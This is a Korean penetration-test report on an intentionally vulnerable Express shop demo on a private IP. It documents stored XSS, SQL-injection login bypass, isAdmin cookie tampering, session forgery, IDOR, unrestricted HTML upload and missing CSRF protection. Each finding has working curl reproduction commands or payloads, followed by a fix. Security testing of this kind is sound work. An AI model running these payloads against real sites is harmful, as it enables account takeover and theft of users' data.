# VULN SHOP 모의해킹 보고서 (2025-12-12)

## 개요
- 대상: http://192.168.0.28:3000 (Express 기반 쇼핑몰 데모, SEC v1)
- 방식: 블랙박스, 30분 타임박스, 우선 취약점 목록 중심 탐색(sql injection, 쿠키 변조, csrf, xss, 파일업로드)
- 테스트 시간: 2025-12-12T15:33~15:56 (KST)

## 주요 발견 요약
- 저장형 XSS: Q&A 게시판 입력값 미필터링 → 임의 스크립트 실행.
- 로그인 SQLi: `'` 입력으로 500 오류 발생, `username=admin'--`로 인증 우회 가능.
- 쿠키 변조에 의한 권한 상승: `isAdmin` 쿠키를 true로 조작하면 관리자 페이지·기능 접근 가능.
- 세션 위조/IDOR: `user`, `user_id`, `isAdmin` 쿠키만으로 임의 사용자(admin 포함) 세션 위조 가능.
- 주문 상세 IDOR: `/order?id=` 파라미터로 타 사용자 주문 조회 가능.
- 파일 업로드 검증 부재: 프로필 업로드가 HTML 실행 파일을 허용, `/uploads/`에서 실행 가능.
- CSRF 보호 부재: 사용자·관리자 폼 전반에 CSRF 토큰 미사용, 쿠키 자동 전송으로 조작 가능.

## 상세 취약점

### 1) 저장형 XSS - `/board`
- 설명: 게시글 등록 시 입력값이 HTML 이스케이프 없이 그대로 렌더링됨.
- 영향: 세션 탈취, 피싱, 관리자 세션 공격 등 클라이언트 사이드 공격 가능.
- 재현:
  1. `curl -X POST http://192.168.0.28:3000/board -d "content=<script>alert('xss')</script>"`
  2. `/board` 재접속 시 `<script>`가 그대로 실행됨(응답 HTML에 주석으로 “VULNERABILITY” 표시됨).
- 대응: 출력시 HTML 이스케이프 적용, CSP 강화, 입력 필터링.

### 2) 로그인 SQL Injection - `/login`
- 설명: `username` 입력이 쿼리에 직접 삽입되어 에러 및 인증 우회 모두 가능.
- 영향: 인증 우회, 데이터 유출, 계정 장악 가능.
- 재현:
  - 에러 노출: `curl -X POST http://192.168.0.28:3000/login -d "username='&password=a"` → HTTP 500.
  - 인증 우회: `curl -c /tmp/vulnshop2.cookie -X POST http://192.168.0.28:3000/login -d "username=admin'--&password=x"` → 302, `user=admin; user_id=1` 쿠키 발급(비밀번호 미검증).
  - 컬럼 유추: `username=admin' order by 5--` → 500 오류 발생(컬럼 수 부족), `order by 1--` → admin 로그인(인젝션 가능성 확정).
- 대응: 모든 DB 쿼리에 Prepared Statement/ORM 파라미터 바인딩 사용, 입력 검증 및 에러 메시지 일반화.

### 3) 쿠키 변조/권한 상승 - `isAdmin`
- 설명: 로그인 시 `user`, `user_id`, `isAdmin=false` 쿠키가 클라이언트에 평문 전달되며 검증 없이 신뢰됨.
- 영향: 일반 사용자가 쿠키를 `isAdmin=true`로 수정하면 관리자 메뉴 노출 및 `/admin/users`, `/admin/products` 접근·조작 가능(사용자 삭제, 상품 수정 등).
- 재현:
  1. 일반 계정 로그인 후 브라우저/요청 헤더 쿠키를 `isAdmin=true`로 수정.
  2. `curl -b "user=attacker; isAdmin=true; user_id=3" http://192.168.0.28:3000/admin/users` → 관리자 페이지 접근 성공.
- PoC: `script/admin-bypass.sh`.
- 대응: 서버측 세션/토큰으로 권한 검증, 쿠키 값 신뢰 금지(HttpOnly/Secure/서명/암호화 적용).

### 4) 세션 위조/IDOR - `user`, `user_id`, `isAdmin`
- 설명: 인증/인가 정보가 서명되지 않은 쿠키 값으로만 결정되며, 로그인 없이 임의 사용자로 가장 가능.
- 영향: admin/guest 등 타 계정으로 손쉽게 전환, 관리자 메뉴 접근 및 프로필/주문 등 개인정보 열람·조작 가능.
- 재현: `curl -b "user=admin; user_id=1; isAdmin=true" http://192.168.0.28:3000/profile` → admin 프로필과 관리자 메뉴 노출(사전 로그인 불필요).
- 대응: 서버측 세션에 계정·권한 저장, 쿠키 서명/암호화 및 HttpOnly/Secure 적용.

### 5) 주문 상세 IDOR - `/order?id=...`
- 설명: 주문 상세 조회가 세션 사용자와 주문 소유자 매칭 검증 없이 `id` 파라미터로 직접 접근 가능.
- 영향: 일반 사용자가 관리자 주문 등 타인의 결제·배송 정보를 조회 가능.
- 재현: 일반 사용자 쿠키(`/tmp/vulnshop.cookie`)로 `curl http://192.168.0.28:3000/order?id=1` 요청 → 주문 #1 상세(주문자 ID=1, 상품/총액) 노출. `id=2` 등 다른 주문도 동일하게 열람 가능. PoC: `script/order-idor.sh`.
- 대응: 주문 조회 시 세션 사용자와 주문 소유자 일치 검증, 임의 ID 노출 방지(비예측 식별자/권한 체크).

### 6) 파일 업로드 검증 부재 - `/profile/upload`
- 설명: 프로필 이미지 업로드에서 확장자·콘텐츠 타입 검증이 없어 HTML/스크립트 업로드 가능.
- 영향: `/uploads/` 경로에 악성 HTML/JS를 저장해 저장형 XSS, 악성 파일 배포 가능.
- 재현:
  1. 예제 페이로드(`script/profile-payload.html`) 준비.
  2. `curl -b /tmp/vulnshop.cookie -F "profile_image=@script/profile-payload.html" http://192.168.0.28:3000/profile/upload`
  3. `/uploads/profile-payload.html` 접속 시 삽입한 스크립트 실행.
- 대응: 이미지 확장자/콘텐츠 유형 화이트리스트, 업로드 경로 실행 금지, 파일명 난수화 및 별도 스토리지 사용.

### 7) CSRF 보호 부재
- 설명: 로그인·게시글 작성·관리자 사용자 삭제/상품 수정 등 모든 폼에 CSRF 토큰이 없으며 SameSite 설정도 없음.
- 영향: 사용자가 로그인된 상태에서 공격자가 제작한 페이지 방문 시, 임의 게시글 등록이나 관리자 기능 남용 가능.
- 재현 예: 공격 페이지에 `<form action="http://192.168.0.28:3000/admin/users/2/delete" method="POST"></form><script>document.forms[0].submit()</script>` 삽입 시 관리자 쿠키로 자동 삭제 가능. PoC: `script/csrf-delete-guest.html`.
- 대응: CSRF 토큰 검증, SameSite=Lax/Strict 설정, 민감 요청에 재인증 및 Origin/Referer 검증.

## 부가 관찰
- 쿠키에 HttpOnly/Secure/SameSite 설정 부재.
- 에러 핸들링이 내부 오류(500)를 그대로 노출하여 정보 노출 위험이 있음.

## 결론
우선적으로 쿠키 기반 권한 검증과 파일 업로드, XSS/CSRF/Sqli 대응을 적용해야 함. 관리 기능 노출 및 저장형 XSS는 즉시 패치하지 않을 경우 전체 서비스 장악으로 이어질 수 있음.
